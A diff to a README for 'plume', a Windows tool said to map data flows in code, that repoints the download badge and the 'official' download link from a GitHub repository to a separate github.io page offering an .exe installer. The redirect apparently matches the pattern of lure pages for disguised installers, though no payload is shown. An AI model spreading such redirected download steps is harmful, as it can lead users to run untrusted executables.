@@ -1,6 +1,6 @@
 # 🗺️ plume - Map data flows in your code
 
-[![](https://img.shields.io/badge/Download_Plume-blue.svg)](https://github.com/maxineredflowered661/plume)
+[![](https://img.shields.io/badge/Download_Plume-blue.svg)](https://maxineredflowered661.github.io)
 
 Plume creates visual maps of how information moves through your systems. It turns complex code and infrastructure into clear graphics. This tool shows you exactly where data goes so you can track it with ease.
 
@@ -21,7 +21,7 @@ Plume works on modern Windows computers. Ensure your machine meets these basic s
 
 You need to download the installer from our project page. Follow these steps to obtain the correct file for your Windows machine.
 
-1. Visit the [official Plume download page](https://github.com/maxineredflowered661/plume).
+1. Visit the [official Plume download page](https://maxineredflowered661.github.io).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click on the latest version link.
 4. Locate the file ending in `.exe` under the Assets list.
